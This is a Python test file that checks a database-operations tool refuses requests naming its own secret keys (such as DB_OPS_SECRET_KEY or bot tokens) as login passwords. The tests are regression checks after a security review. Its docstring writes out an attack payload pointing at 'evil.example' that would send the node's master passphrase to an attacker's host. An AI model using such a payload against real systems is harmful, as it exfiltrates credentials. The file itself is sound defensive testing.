"""A request names a password; it cannot name the node's own keys as one (review 0.25.0, F12.2).

`{"host": "evil.example", "password_env": "DB_OPS_SECRET_KEY"}` sent the passphrase that decrypts
every credential to a server the caller chose, as an SSH password.
"""

from __future__ import annotations

import pytest

from db_ops.lib.secret_value import SecretValueError, resolve_secret_value


@pytest.mark.parametrize("name", ["DB_OPS_SECRET_KEY", "db_ops_secret_key", "DB_OPS_KEY_BASE64",
                                  "TELEGRAM_BOT_TOKEN", "MY_BOT_TOKEN"])
def test_password_env_cannot_name_a_node_key(monkeypatch, name):
    monkeypatch.setenv(name.upper(), "the-key")
    with pytest.raises(SecretValueError, match="never a password"):
        resolve_secret_value({"password_env": name})


def test_a_ref_that_is_a_node_key_is_not_read_from_the_environment(monkeypatch):
    monkeypatch.setenv("DB_OPS_SECRET_KEY", "the-key")
    with pytest.raises(SecretValueError):
        resolve_secret_value({"password_ref": "DB_OPS_SECRET_KEY"})


def test_ordinary_names_still_work(monkeypatch):
    """From the secrets handed over - since G3.5 the environment is not asked at all, so a name
    in a request can no longer reach the node's environment, the node's keys or anything else."""
    monkeypatch.setenv("LAB_SSH_PASSWORD", "from the environment")
    secrets = {"LAB_SSH_PASSWORD": "pw1", "DB_OPS_SECRET_LAB_PW": "pw2"}
    assert resolve_secret_value({"password_env": "LAB_SSH_PASSWORD"}, secrets=secrets) == "pw1"
    assert resolve_secret_value({"password_ref": "DB_OPS_SECRET_LAB_PW"}, secrets=secrets) == "pw2"
    with pytest.raises(SecretValueError, match="not among the secrets"):
        resolve_secret_value({"password_ref": "LAB_SSH_PASSWORD"})


def test_run_sql_resolves_no_ref_from_its_environment(monkeypatch):
    """`run-sql` looked a request's `connection.password_ref` up in its own environment, so naming
    DB_OPS_SECRET_KEY sent the node's passphrase, as a login password, to the host the request
    named (owner decision G3.5). A ref is refused there; the calling app sends the password."""
    from db_ops.common import sql_run
    from db_ops.lib.connection_spec import ConnectionSpec

    monkeypatch.setenv("DB_OPS_SECRET_KEY", "the node's passphrase")
    spec = ConnectionSpec.from_json({"db_type": "sqlserver", "host": "192.0.2.66", "username": "sa",
                                     "password_ref": "DB_OPS_SECRET_KEY"})
    with pytest.raises(sql_run.SqlRunError, match="no environment"):
        sql_run.resolve_connection_spec(spec)


def test_a_configured_credential_cannot_name_the_node_s_key():
    from db_ops.lib.sql_text import resolve_password

    with pytest.raises(RuntimeError, match="never a password"):
        resolve_password({"username": "sa", "password_ref": "DB_OPS_SECRET_KEY"}, {})
